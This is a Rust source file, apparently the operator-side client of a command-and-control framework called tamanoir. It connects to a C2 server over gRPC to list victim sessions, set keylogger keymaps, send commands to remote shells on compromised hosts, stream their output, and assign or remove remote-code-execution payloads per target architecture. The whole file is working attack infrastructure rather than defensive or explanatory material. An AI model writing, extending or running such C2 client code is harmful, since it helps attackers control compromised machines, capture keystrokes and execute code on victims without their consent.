use std::{
    collections::{hash_map::Entry, HashMap},
    net::Ipv4Addr,
    sync::{Arc, RwLock},
};

use tamanoir_common::Layout;
use tokio::sync::mpsc;
use tokio_stream::StreamExt;
use tonic::{transport::Channel, Code, Request, Status};

use crate::{
    app::{AppResult, SessionsMap},
    event::Event,
    notification::NotificationSender,
    section::{
        keylogger::init_keymaps,
        shell::{ShellCommandEntry, ShellCommandHistoryMap, ShellHistoryEntryType},
    },
    tamanoir_grpc::{
        rce_client::RceClient, remote_shell_client::RemoteShellClient,
        session_client::SessionClient, Empty, SessionRcePayload, SessionRequest, SessionResponse,
        SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
    },
};

#[derive(Debug, Clone)]
pub struct SessionServiceClient {
    pub client: SessionClient<Channel>,
    pub notification_sender: NotificationSender,
}

#[derive(Debug, Clone)]
pub struct RemoteShellServiceClient {
    pub client: RemoteShellClient<Channel>,
    pub notification_sender: NotificationSender,
}

#[derive(Debug, Clone)]
pub struct RceServiceClient {
    pub client: RceClient<Channel>,
    pub notification_sender: NotificationSender,
}
pub fn catch_grpc_err(e: Status, notification_sender: &NotificationSender) -> Status {
    if e.code() == Code::Unavailable {
        let _ = notification_sender.error("C2 server unreachable");
    } else {
        let _ = notification_sender.error(e.message());
    }
    e
}

impl SessionServiceClient {
    pub async fn new(
        ip: Ipv4Addr,
        port: u16,
        event_sender: mpsc::UnboundedSender<Event>,
    ) -> AppResult<Self> {
        let client = SessionClient::connect(format!("http://{ip}:{port}")).await?;
        init_keymaps();
        Ok(Self {
            client,
            notification_sender: NotificationSender {
                sender: event_sender,
                ttl: 3,
            },
        })
    }

    pub async fn list_sessions(&mut self) -> AppResult<Vec<SessionResponse>> {
        Ok(self
            .client
            .list_sessions(tonic::Request::new(Empty {}))
            .await?
            .into_inner()
            .sessions)
    }
    pub async fn update_session_layout(
        &mut self,
        session_ip: String,
        layout: Layout,
    ) -> AppResult<()> {
        let _ = self
            .client
            .set_session_layout(tonic::Request::new(SetSessionLayoutRequest {
                ip: session_ip,
                layout: layout as u32,
            }))
            .await
            .map_err(|e| catch_grpc_err(e, &self.notification_sender));

        Ok(())
    }
}
impl RemoteShellServiceClient {
    pub async fn new(
        ip: Ipv4Addr,
        port: u16,
        event_sender: mpsc::UnboundedSender<Event>,
    ) -> AppResult<Self> {
        let client = RemoteShellClient::connect(format!("http://{ip}:{port}")).await?;
        Ok(Self {
            client,
            notification_sender: NotificationSender {
                sender: event_sender,
                ttl: 3,
            },
        })
    }
    pub async fn send_cmd(&mut self, ip: String, cmd: String) -> AppResult<()> {
        let shell_msg = ShellStd {
            ip: ip.clone(),
            message: cmd.clone(),
        };
        let msg = Request::new(shell_msg);

        let _ = self
            .client
            .send_shell_std_in(msg)
            .await
            .map_err(|e| catch_grpc_err(e, &self.notification_sender));
        Ok(())
    }
}

impl RceServiceClient {
    pub async fn new(
        ip: Ipv4Addr,
        port: u16,
        event_sender: mpsc::UnboundedSender<Event>,
    ) -> AppResult<Self> {
        let client = RceClient::connect(format!("http://{ip}:{port}")).await?;
        Ok(Self {
            client,
            notification_sender: NotificationSender {
                sender: event_sender,
                ttl: 3,
            },
        })
    }
    pub async fn set_session_rce(
        &mut self,
        session_ip: String,
        rce: String,
        target_arch: String,
    ) -> AppResult<()> {
        self.delete_session_rce(session_ip.clone()).await?;
        let msg = SetSessionRceRequest {
            ip: session_ip.clone(),
            rce,
            target_arch,
        };
        let _ = self
            .client
            .set_session_rce(msg)
            .await
            .map_err(|e| catch_grpc_err(e, &self.notification_sender))?;

        Ok(())
    }
    pub async fn delete_session_rce(&mut self, session_id: String) -> AppResult<()> {
        let _ = self
            .client
            .delete_session_rce(SessionRequest { ip: session_id })
            .await
            .map_err(|e| catch_grpc_err(e, &self.notification_sender))?;
        Ok(())
    }
    pub async fn list_available_rce(&mut self) -> anyhow::Result<Vec<SessionRcePayload>> {
        let ret: Result<tonic::Response<crate::tamanoir_grpc::AvailableRceResponse>, Status> = self
            .client
            .list_available_rce(Request::new(Empty {}))
            .await
            .map_err(|e| catch_grpc_err(e, &self.notification_sender));
        let res = match ret {
            Ok(res) => res.into_inner().rce_list,
            Err(_) => vec![],
        };
        Ok(res)
    }
}
pub trait StreamReceiver<T> {
    fn listen(
        &mut self,
        update_object: Arc<RwLock<T>>,
    ) -> impl std::future::Future<Output = anyhow::Result<()>> + Send;
}

impl StreamReceiver<HashMap<String, Vec<ShellCommandEntry>>> for RemoteShellServiceClient {
    async fn listen(&mut self, update_object: ShellCommandHistoryMap) -> anyhow::Result<()> {
        let mut stream = self
            .client
            .watch_shell_std_out(Request::new(Empty {}))
            .await?
            .into_inner();

        while let Some(Ok(msg)) = stream.next().await {
            let session_id = msg.ip;
            let entry = ShellCommandEntry {
                entry_type: ShellHistoryEntryType::Response,
                text: msg.message,
                session_id: session_id.clone(),
            };
            let mut update_obj_inner = update_object.write().unwrap();
            match update_obj_inner.entry(session_id) {
                Entry::Vacant(e) => {
                    e.insert(vec![entry]);
                }
                Entry::Occupied(mut e) => {
                    e.get_mut().push(entry);
                }
            }
        }
        Ok(())
    }
}
impl StreamReceiver<HashMap<String, SessionResponse>> for SessionServiceClient {
    async fn listen(&mut self, update_object: SessionsMap) -> anyhow::Result<()> {
        let mut stream = self
            .client
            .watch_sessions(Request::new(Empty {}))
            .await?
            .into_inner();
        while let Some(msg) = stream.next().await {
            let msg = msg?;
            // compare session old state to new state to catch events we want to send notification for
            if let Some(session) = update_object.read().unwrap().get(&msg.ip.clone()) {
                if session.shell_availability != msg.shell_availability {
                    match msg.shell_availability {
                        true => {
                            let _ = self
                                .notification_sender
                                .info(format!("{}: New Shell Connection", msg.ip));
                        }
                        false => {
                            let _ = self
                                .notification_sender
                                .warning(format!("{}: Shell Disconnected", msg.ip));
                        }
                    }
                }
            }
            update_object
                .write()
                .unwrap()
                .insert(msg.ip.clone(), msg.clone());
        }
        Ok(())
    }
}
